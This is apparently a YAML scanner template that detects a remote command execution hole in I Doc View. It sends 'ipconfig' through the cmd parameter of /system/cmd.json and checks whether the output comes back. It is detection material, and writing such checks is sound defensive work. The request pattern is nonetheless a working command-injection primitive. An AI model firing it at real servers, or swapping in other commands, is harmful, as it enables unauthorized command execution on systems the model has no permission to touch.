# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"code":"1"'
          - '"data":'
          - Windows IP
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/system/cmd.json?cmd=ipconfig'
id: idocview-cmd-rce
info:
  author: Wen
  description: ""
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: I Doc View cmd.json命令执行漏洞
  severity: high
  tags: idocview,rce,argus-import
